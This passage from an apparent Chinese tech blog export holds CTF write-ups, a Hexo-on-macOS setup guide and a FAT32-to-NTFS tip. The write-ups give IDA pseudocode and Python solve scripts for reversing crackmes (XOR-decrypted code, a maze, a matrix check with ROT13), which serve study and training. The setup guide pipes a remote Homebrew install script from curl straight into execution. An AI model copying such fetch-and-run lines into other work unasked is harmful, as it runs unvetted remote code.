) *((_BYTE *)dword_401000 + i) ^= 0xBBu; v9 = 32123; v8 = 1734437990; v10 = 0; j = 0; do &#123; if ( input[j] != *((_BYTE *)&amp;v8 + j) ) goto LABEL_8; ++j; &#125; while ( j &lt; 5 ); LOBYTE(i) = v7; if ( v7 != *((_BYTE *)&amp;v8 + j) )LABEL_8: exit(0); ((void (__fastcall *)(int, char *))loc_4010B0)(i, input); &#125; return 0;&#125; 可以用 IDAPython 来 patch 一下： 123456from ida_bytes import *start_addr = 0x00401000end_addr = 0x00401260for i in range(start_addr, end_addr, 4): tmp = get_bytes(i, 1) patch_bytes(i, chr(ord(tmp) ^ 0xbb)) 或者用 Ollydbg 把解密过后的程序 dump 出来。找到加密过后的位置设下断点，断下来之后 dump 即可（注意前面还需要过一个长度的 check）： 把 dump 出来的程序拖进 ida： 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // ecx signed int j; // eax char input[39]; // [esp+0h] [ebp-40h] char v7; // [esp+27h] [ebp-19h] int v8; // [esp+34h] [ebp-Ch] __int16 v9; // [esp+38h] [ebp-8h] char v10; // [esp+3Ah] [ebp-6h] input[0] = 0; memset(&amp;input[1], 0, 0x31u); printf(\"input flag:\\n\"); scanf(\"%50s\", input); if ( strlen(input) == 40 ) &#123; for ( i = 0; i &lt; (char *)nullsub_1 - (char *)maze_solve; ++i ) *((_BYTE *)maze_solve + i) ^= 0xBBu; v9 = '&#125;&#123;'; v8 = 'galf'; v10 = 0; j = 0; do &#123; if ( input[j] != *((_BYTE *)&amp;v8 + j) ) goto LABEL_8; ++j; &#125; while ( j &lt; 5 ); LOBYTE(i) = v7; if ( v7 != *((_BYTE *)&amp;v8 + j) )LABEL_8: exit(0); base64(i, input); &#125; return 0;&#125; 进入加密函数后，先是对六位异或，然后 base64 几位字符，最后走个 maze。solve 脚本： 123456789101112131415161718192021import base64flag = 'flag&#123;'enc1 = [0xF2, 0xEE, 0xEF, 0xF5, 0xD9, 0xEF]for i in range(len(enc1)): flag += chr(enc1[i] ^ 0x86)enc2 = 'z91c'[::-1] + 'fNWb'[::-1]flag += base64.b64decode(enc2)# maze# --------# g + +# + + ++ +# + + #+ +# + ++++ +# + ++++ +# + +# --------# 'a'-down '2'-up 'q'-left 'w'-rightpath = 'waaaaawwwww22222qqaaw'flag += pathflag += '&#125;'print 'flag:', flag 秋名山车神12$ file re5re5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1c630722da16df2163ff83ea21cce93bf6b71a87, not stripped 32 位 elf 拖进 ida 查看： 123456789101112131415161718192021222324252627282930313233343536373839404142int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+0h] [ebp-2F0h] char m_t; // [esp+80h] [ebp-270h] char matrix; // [esp+180h] [ebp-170h] char input; // [esp+282h] [ebp-6Eh] int pipes[2]; // [esp+2C8h] [ebp-28h] __pid_t pid; // [esp+2D0h] [ebp-20h] size_t length; // [esp+2D4h] [ebp-1Ch] int *v11; // [esp+2E4h] [ebp-Ch] v11 = &amp;argc; length = 0; memset(&amp;v4, 0, 0x80u); puts(\"input flag:\"); __isoc99_scanf(); length = strlen(&amp;input); if ( length != 64 ) return 0; if ( pipe(pipes) &lt; 0 ) exit(1); pid = fork(); if ( pid &lt; 0 ) exit(1); if ( pid &lt;= 0 ) // children process &#123; close(pipes[1]); read(pipes[0], &amp;input, length); ck2((char **)&amp;matrix, &amp;input); ck3((char **)key_matrix, (char **)&amp;matrix, (int)&amp;m_t, 8, 8, 8); if ( ck4((int)&amp;m_t) ) printf(\"Congratulate!!!\"); &#125; else // father process &#123; close(pipes[0]); ck1(&amp;input, length); write(pipes[1], &amp;input, length); wait(0); &#125; return 0;&#125; main 函数中主要是先读取一个字符串，如果长度不为 64 则退出。之后 fork 了一个子进程，然后新建一个 pipe，在父进程把字符串输入 pipe，经过ck1()之后送到 pipe 里；子进程从 pipe 读取字符串，经过ck2()和ck3()后，在ck4()里判断。下面一个个分析。 ck1()是 rot13 加密： 12345678910111213141516171819202122232425262728293031int __cdecl ck1(char *input, int length)&#123; int result; // eax char v3; // [esp+Bh] [ebp-5h] int i; // [esp+Ch] [ebp-4h] for ( i = 0; ; ++i ) &#123; result = i; if ( i &gt;= length ) break; v3 = input[i] + 13; if ( input[i] &lt;= 96 || input[i] &gt; 122 ) &#123; if ( input[i] &lt;= 64 || input[i] &gt; 90 ) &#123; v3 = input[i]; &#125; else if ( (unsigned __int8)v3 &gt; 0x5Au ) &#123; v3 = input[i] - 13; &#125; &#125; else if ( (unsigned __int8)v3 &gt; 0x7Au ) &#123; v3 = input[i] - 13; &#125; input[i] = v3; &#125; return result;&#125; ck2()这里把输入的字符串转化成 8x8 的矩阵： 123456789101112131415161718192021222324signed int __cdecl ck2(char **m, char *input)&#123; signed int result; // eax int v3; // eax char *v4; // edx int v5; // [esp+4h] [ebp-Ch] signed int i; // [esp+8h] [ebp-8h] signed int j; // [esp+Ch] [ebp-4h] result = 134520832; v5 = 0; for ( i = 0; i &lt;= 7; ++i ) &#123; for ( j = 0; j &lt;= 7; ++j ) &#123; v3 = v5; v5 += (int)&amp;(&amp;GLOBAL_OFFSET_TABLE_)[4290763520] + 1; v4 = (char *)input[v3]; result = j; (&amp;m[8 * i])[j] = v4; &#125; &#125; return result;&#125; ck3()将输入的矩阵与一个 global 的矩阵key相乘： 123456789101112131415161718192021222324252627int __cdecl ck3(char **key, char **input, char **a3, int a4_8, int a5_8, int a6_8)&#123; int result; // eax int m; // [esp+4h] [ebp-10h] int i; // [esp+8h] [ebp-Ch] int k; // [esp+8h] [ebp-Ch] int j; // [esp+Ch] [ebp-8h] int l; // [esp+Ch] [ebp-8h] for ( i = 0; i &lt; a5_8; ++i ) &#123; for ( j = 0; j &lt; a4_8; ++j ) (&amp;a3[8 * i])[j] = 0; &#125; for ( k = 0; ; ++k ) &#123; result = k; if ( k &gt;= a5_8 ) break; for ( l = 0; l &lt; a4_8; ++l ) &#123; for ( m = 0; m &lt; a6_8; ++m ) (&amp;a3[8 * k])[l] = &amp;(&amp;a3[8 * k])[l][(_DWORD)(&amp;key[8 * k])[m] * (_DWORD)(&amp;input[8 * m])[l]]; &#125; &#125; return result;&#125; 最后的ck4()将输出的矩阵与 global 的enc_flag进行比较： 123456789101112131415signed int __cdecl ck4(char **m)&#123; signed int i; // [esp+8h] [ebp-Ch] signed int j; // [esp+Ch] [ebp-8h] for ( i = 0; i &lt;= 7; ++i ) &#123; for ( j = 0; j &lt;= 7; ++j ) &#123; if ( (&amp;m[8 * i])[j] != *(char **)&amp;enc_flag[4 * (8 * i + j)] ) return 0; &#125; &#125; return 1;&#125; 主要用 numpy，可以比较方便地实现矩阵间的运算。脚本如下： 1234567891011121314151617181920212223242526272829303132333435import numpy as npkey = [0x0000002B, 0x00000016, 0x0000001E, 0x00000053, 0x00000035, 0x00000039, 0x00000020, 0x00000029, 0x00000035, 0x00000063, 0x0000000A, 0x00000028, 0x0000002C, 0x00000006, 0x00000032, 0x0000002A, 0x00000055, 0x00000039, 0x00000014, 0x0000005F, 0x00000020, 0x00000019, 0x00000034, 0x00000021, 0x00000019, 0x0000000B, 0x0000005A, 0x00000009, 0x00000050, 0x00000034, 0x0000006F, 0x0000005C, 0x00000016, 0x0000001A, 0x00000068, 0x00000063, 0x00000034, 0x0000004E, 0x00000016, 0x00000045, 0x0000004C, 0x00000053, 0x0000002F, 0x0000003F, 0x0000003F, 0x00000028, 0x00000069, 0x00000051, 0x00000039, 0x00000044, 0x00000012, 0x00000024, 0x0000000A, 0x0000004D, 0x00000055, 0x00000031, 0x00000049, 0x0000003B, 0x00000040, 0x0000003B, 0x00000043, 0x00000028, 0x00000021, 0x00000036]enc = [0x00009A06, 0x0000879A, 0x00007DC4, 0x00008F1F, 0x000088AC, 0x0000850B, 0x0000785D, 0x0000822E, 0x00008FBC, 0x00007F69, 0x000081E5, 0x00008714, 0x00008572, 0x00008786, 0x00006A94, 0x000076FE, 0x0000A871, 0x00009A1E, 0x0000967E, 0x00009D97, 0x00009D4B, 0x00009AC6, 0x00007E38, 0x00008C62, 0x0000CD4A, 0x00009116, 0x0000A837, 0x0000A960, 0x0000A3A7, 0x00009B7E, 0x0000AC9C, 0x0000AB9E, 0x0000C94C, 0x0000AD7C, 0x0000A2C8, 0x0000BD86, 0x0000B1ED, 0x0000AD94, 0x0000A195, 0x0000AFE8, 0x0000ED71, 0x0000C239, 0x0000CD7E, 0x0000D459, 0x0000CEFF, 0x0000CBBC, 0x0000B972, 0x0000C36F, 0x0000A82A, 0x000089EF, 0x00008CBF, 0x00009AD1, 0x0000868F, 0x000086A6, 0x00007A26, 0x00007CD2, 0x0000C000, 0x0000A97A, 0x0000A470, 0x0000B3C8, 0x0000AFE5, 0x0000ABB9, 0x00008F7D, 0x0000A70A]key = np.mat(key).reshape(8, 8)enc = np.mat(enc).reshape(8, 8)# enc = key * out# out = key逆 * encout = key.I * encout = out.reshape(1, 64).tolist()[0]for i in range(len(out)): out[i] = int(round(out[i]))print outflag = ''for i in range(len(out)): flag += chr(out[i])print flagdef rot13(s): out = '' for ch in s: tmp = ord(ch) + 13 if ch.isupper(): if tmp &gt; 90: tmp -= 26 elif ch.islower(): if tmp &gt; 122: tmp -= 26 else: tmp = ord(ch) out += chr(tmp) return outflag = rot13(flag)print 'flag:', flag CRYPTO贝斯家族永不言败各种 base 解码。 壮壮可能是疯了…通过猪圈密码解开第一步。 MISC这是神魔鬼词频题，解码网站在这里。 表情包 10 块钱用 stegsolve 打开 gif 逐帧查看，快速看过 260+的图像后，收集到一张二维码的四片碎片，用美图秀秀拼接起来，再 XOR 一下，扫码得到 flag。 童年用金手指作弊通关魂斗罗得到 flag。 参考网站https://esebanana.github.io/2018/05/07/wp_2018_5_7_ZJGSUCTF/https://bbs.pediy.com/thread-158896.htmhttps://esebanana.github.io/2018/04/08/re_10_tls_smc/https://esebanana.github.io/2018/04/12/re_11_tou_ke/https://www.52pojie.cn/thread-593356-1-1.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"macOS下利用Hexo和Github搭建博客","slug":"macOS下利用Hexo和Github搭建博客","date":"2018-04-17T12:50:09.000Z","updated":"2020-03-06T11:02:40.616Z","comments":true,"path":"2018/04/17/macOS下利用Hexo和Github搭建博客/","link":"","permalink":"blog.b3ale.cn/2018/04/17/macOS下利用Hexo和Github搭建博客/","excerpt":"把双系统的 Win10 删了，改用 macOS。发现自己的博客忘记备份了，只好在 macOS 上重新搭建一个。","text":"把双系统的 Win10 删了，改用 macOS。发现自己的博客忘记备份了，只好在 macOS 上重新搭建一个。 安装流程： Hexo 是基于 Nodejs 的，需安装 Nodejs，安装 Nodejs 最好选择 Homebrew 首先查看电脑是否安装 Ruby，因为 Homebrew 安装依赖 Ruby 安装顺序：Homebrew-&gt;Nodejs-&gt;Hexo 安装 homebrew1ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; 安装 nodejs1brew install node 安装 hexo12sudo npm install -g hexo# 可以加上 --registry=https://registry.npm.taobao.org 创建文件夹123mkdir blogcd bloghexo init 生成一套静态网页12hexo generatehexo server 在 localhost 的 4000 端口上就能看到本地搭建的博客 撰写博客1hexo new post &quot;balabala&quot; ‘balabala’即为博文的名字。 修改配置1234deploy: type: git repo: https://github.com/xxx/xxx.github.io branch: master 直接在_config.yml 中修改配置（xxx 为 github 的 name） 安装 hexo-deployer-git12npm install hexo-deployer-git --save# 可以加上 --registry=https://registry.npm.taobao.org 同步 Github1hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy 这样基础的搭建就完成啦！","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"blog.b3ale.cn/tags/hexo/"},{"name":"github","slug":"github","permalink":"blog.b3ale.cn/tags/github/"},{"name":"macos","slug":"macos","permalink":"blog.b3ale.cn/tags/macos/"}]},{"title":"解决复制文件时对于目标文件系统文件过大","slug":"解决复制文件时对于目标文件系统文件过大","date":"2018-02-26T09:00:34.000Z","updated":"2019-08-26T05:54:15.884Z","comments":true,"path":"2018/02/26/解决复制文件时对于目标文件系统文件过大/","link":"","permalink":"blog.b3ale.cn/2018/02/26/解决复制文件时对于目标文件系统文件过大/","excerpt":"今天在复制一个文件到 U 盘的时候，突然弹出了‘对于目标文件系统过大’的对话框，一个 4G 多的文件就这样不能够被复制到目标目录下了。","text":"今天在复制一个文件到 U 盘的时候，突然弹出了‘对于目标文件系统过大’的对话框，一个 4G 多的文件就这样不能够被复制到目标目录下了。 其实这是目标硬盘的格式不正确的原因，我这个 U 盘格式是 FAT32，应该将其修改成 NTFS 格式就可以了。 修改方法：在 cmd 中输入convert M:/fs:ntfs，其中‘M’是所在的磁盘，按回车键。 格式转换完成，再次复制文件，即可成功！","categories":[],"tags":[{"name":"solution","slug":"solution","permalink":"blog.b3ale.cn/tags/solution/"}]},{"title":"网络安全实验室-基础关","slug":"网络安全实验室-基础关","date":"2017-11-19T12:51:38.000Z","updated":"2019-04-29T10:18:59.000Z","comments":true,"path":"2017/11/19/网络安全实验室-基础关/","link":"","permalink":"blog.b3ale.cn/2017/11/19/网络安全实验室-基础关/","excerpt":"第一次写wp，主要是一些web题。","text":"第一次写wp，主要是一些web题。 第一题key在哪里？分值: 100过关地址 第二题再加密一次你就得到key啦~分值: 150加密之后的数据为xrlvf23xfqwsxsqf 第三题猜猜这是经过了多少次加密？分值: 200加密后的字符串为: Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlhSWFRWaENSbFpYZUZOVWJVWTJVbFJDVjAxdVVuWlZha1pYWkVaT2NscEdhR2xTTW1ob1YxWlNTMkl4U2tkWGJHUllZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZXVEpWYkZKSFZqRmFSbUl6WkZkaGExcG9WakJhVDJOdFJraGhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5XRUpIVmpKNFQxWlhTa2RqUm14aFUwaENTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTVZwaFpFZFNTRkpyTlZOaVJtOTNWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSFVuTlZha0p6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZsNlJsZGpiSEJIV2tkc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JVVW14d2VGVXlkR0ZpUmxwelYyeHdXR0V4Y0hKWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUnRWa2RqUld4VllsZG9WRlJYTlc5V1ZscEhXVE5vYVUxWFVucFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaHBVbGhCZDFac1pEUmpNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVk5yWkZOaVJrcDZWa2N4YzFVeVNuSlRiVVpYVFc1b1dGZFdXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZaZUdKSVNsaGhNMUpVVlcxNGQyVkdWbGRoUnpsb1RWWndlbFl5Y0VkV01ERjFZVWhLV2xaWFVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrNXlXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFZWbGN4TkdReVZrZFdXR3hyVWpOU2IxbHNWbmRXTVZwMFkwZEdXR0pHY0ZoWk1HUnZWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsWlpiWFIzWVVaV2RHVkZkR3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFoxWTBaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlWRlJHUzA1c1drZFZhMlJXVFZad01GVnRkRzlWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVLYkZKdFVubGFSV1IzWVZaYWNtTkZiRmRpUjFFd1ZrUktSMVl4VGxsalJuQk9UVzFvV1ZkV1VrZGtNa1pIVjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBWWVRKU1NGVnFSbUZYVm5CSVlVWk9WMVpHV2xaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWGFFeFdNbmhoVjBaV2NscEhSbGROTW1oSlYxUkplRk14U1hoalJXUmhVbFJXVDFWc2FFTlRNVnAwVFZSQ1ZrMVZNVFJXYkdodlYwWmtTR0ZHYkZwaVdHaG9WbTE0YzJOc2NFaFBWM0JUWWtoQ05GWnJZM2RPVmxsNFYyNVNWbUpIYUZoV2FrNU9UVlphV0dNemFGaFNiRnA1V1ZWYWExUnRSbk5YYkZaWFlUSlJNRmRXV2t0ak1WSjFWRzFvVTJKR2NGbFhWM2hoVW0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZ3TUZsVldsTldWbHBZWVVWU1ZrMXVhR2haZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHJaRzlXYkZwMFpVaGtUazFXYkROV01qVkxZa1pLZEZWdWJHRlNWMUl6V1ZaYVlXTnRUa1ppUm1ScFVqRkZkMWRXVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGROYWtaSFdsWmFWMk5zY0VoU2JHUk9UVzFvU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlrWndhVmRIYUc5V2JYQkhZekpOZUdORmFGQldiVkpVV1d4b2IxbFdaRlZSYlVab1RXdHdTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVNsSk5SbFkyVW10MGFrMVlRa3BXYlhoVFlWWktjMk5HYkZoV00xSm9Xa1JCTVdNeFpISmhSM2hUVFVad2FGWnRNSGhWTVVsNFZXNU9XR0pWV2xkVmJYaHpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbTF3UzFNeVRuTlVia3BxVW0xb2NGVnRlSGRsVm1SWlkwVmtWMkpXV2xoV1J6VlBZVlpLZFZGck9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1IxVkd4U2FFMXRhRzlXVjNSWFdWZE9jMVp1UmxSaE0xSlZWbTE0UzAxR2JGWlhhemxYVFZad1NGWXljRXRXTWtwSVZHcFNWV0V5VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5HVm5WWGJHUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVbGhVVmxaM1ZXeGFjMVZyVG1oTlZXdzBWVEZvYzFVeVJYbGhTRUpXWWxoTmVGa3dXbk5XVmtaMVdrVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm01d1YxWkdXbkZUYTFwc1ZteGFNVlZ0ZUdGaFZrbDRVbGhrVjJKVVJUQlpla3BPWlVkT1JtRkdRbGRpVmtwVlYxZDBWMlF4WkhOWGEyaHNVak5DVUZadGVITk9SbGw1VGxaT1YySlZjRWxaVlZwdlZqSkdjazVWT1ZWV2JIQm9WakJrVG1WdFJrZGhSazVwVW01Qk1sWXhXbGRaVjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxME1HRnJNVmRUYWtaWFZqTm9VRmxXV2twbFJrNTFXa1prYUdFd2NGaFdSbFpXWlVaSmVGcElTbWhTTTFKVVZGVmFkMlJzV2tkYVNIQk9WakZhZWxZeGFITlVNVnB5VGxjNVZWWnNXak5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUm1ob1RXMW9WbGRYZEd0aU1rbDRWbTVHVW1KVldsaFphMXAzVFVad1ZtRkhkRlZoZWtaYVZWZDRjMWxXV2xoaFJYaGFZVEZ3WVZwVldtdGpiVTVIWVVkb1RsZEZTbEpXYlRGM1V6RktkRlpyYUZWaE1WcFlXV3RrVTFaR1ZuTlhibVJzVm0xU1dsa3dWbXRXTWtwWFVtcE9WVlpzV25wWlZscEtaVmRHUjFWc2NHbFNNbWd5Vm1wR1lXRXhaRWhXYTJoUVZtdHdUMVpzVWtaTlJtUlZVVzFHV2xac2JEUlhhMVp2WVVaS2MxTnNXbGRpVkVaVVZtdGFkMWRIVmtsVWJHUnBVakZLTmxaclkzaGlNVmw1VWxod1VsZEhhRmhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURjZUVlV4UjFadVVteFNWR3h3VldwQ2QxZHNiRlpWYkU1WFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMlF4UlhoaVJtaFZZVEpTV0ZsdGVFdGpNVlYzV2taT2FrMVhlSGxXTWpWUFZERmFkVkZzWkZwV1YxRjNWakJhUzJOdFNrVlViR1JwVjBWS1ZWWnFTbnBsUmtsNFZHNU9VbUpIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYXpsVlZucEdkbFV5ZUZwbFJsWnlZMGQ0VTJGNlJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXdGFTMWRHV2tWU2JHUnFUV3RhUjFaSGVGTlViRnAxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWMWQwYTJJeVVuTlhXR1JZWWxoU1ZWVnFRbUZUVm14V1YyMUdWV0pGY0RGVlZ6QTFWakpLVlZKVVFscGxhM0JRV1hwR2QxTldUblJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKcmNHRlVWRXBUVlVaYWRHVklUazlTYkd3MVZHeFZOV0ZIU2taalJteGFWbFp3ZWxacVNrWmxSbHBaWVVkR1UwMHlhRFpXYlhCSFdWWmtXRkpyWkdoU2F6VndWVzAxUWsxc1dYaFhiR1JhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1FMUhSbkpOVm1SVVlXdGFXRlpxVG05U1JscHhVMnQwVTAxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVZsUkdXbVZIVGtaaVJsWnBVakpvZDFadGVHRmtNV1JIVjJ0a1dHSlZXbkZVVlZKWFUwWlplR0ZJVGxWTlZuQjVWR3hqTlZaV1duTlhibkJWWWtad2VsWnRNVWRTYkZKeldrZHNWMWRGU2t0V01WcFhWakZWZUZkWVpFNVdiVkp4VldwS2IxbFdVbGRYYm1SV1VtMTBORll5ZUd0aGF6RllWVzVzVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdsZHNWbUZoTVZsM1RWaEdWMkpyY0ZoV2ExWjNWRVpWZUZkclpHcGlWVnBJVjJ0YVQxUnJNWFJoUmxwWFlsUkdNMVY2Ums1bFZsSjFWR3hXYVdFelFuWldWekI0VlRGYVIxVnNWbFJpVkd4d1ZGWmFkMlZXV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlp0VWxaVlZ6RkhZVlV4Y2xkcVFsZGlWRlpNVmpCa1MxTkhWa2RhUm5CcFVqSm9WVlpHVWtka01WbDRXa2hTYTFJelFuQlZha1pLWkRGYVJWSnRkR2xOVm13elZGWldhMkZGTUhsbFJtaGFZa1pLUTFwVlduTmpWa3B6WTBkNFUySldTalZXYWtvMFZUSkdXRk5yYkZKaVIyaFlXV3hvVTFkR1pGZGFSbVJxVFZkU01WVnRlRTloVmtsNFUyNW9WMUpzY0hKV1ZFcFhZekpLUjFkdFJsUlNWRloyVm0weE5HUXlWbGRoTTJSV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNREZIVjFob1ZWZEhhR2hWYkdSVFZqRnNjbHBHVGxoV2JYZ3dWRlphVDJGck1WZGpSRUpoVmxkb1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVdXbmxXUjNocllVZFdjMWRzYkZkaGExcDJXV3BLUjJNeFRuTmhSMmhUWlcxNFdGZFdaREJrTWxKelYydFdVMkpHY0hKVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkZNVmRVYkZKVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKRlNtaFdiR1JUVTBaYWMxZHRSbGROYXpWSVYydGFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5WVVkd1UwMXVhRmxXYWtKWFV6Rk9SMWR1VW14U00xSlFWV3BDVjA1R1dsaE9WazVXVFd0d2VWUnNXbk5YYlVWNFkwZG9WMDFXY0doYVJWVjRWakZPY2s1V1RtbFNiWFExVm14amQyVkdTWGxTYmxKVFlXeHdXRmxyWkc5WlZteFZVbTVrVlZKdGVGaFdNblF3WVdzeGNrNVZhRnBoTVhCMlZtcEJkMlZHVG5SUFZtaG9UVlZ3U1ZkV1VrZFhiVlpIWTBWc1ZHSlhhRlJVVkVaTFZsW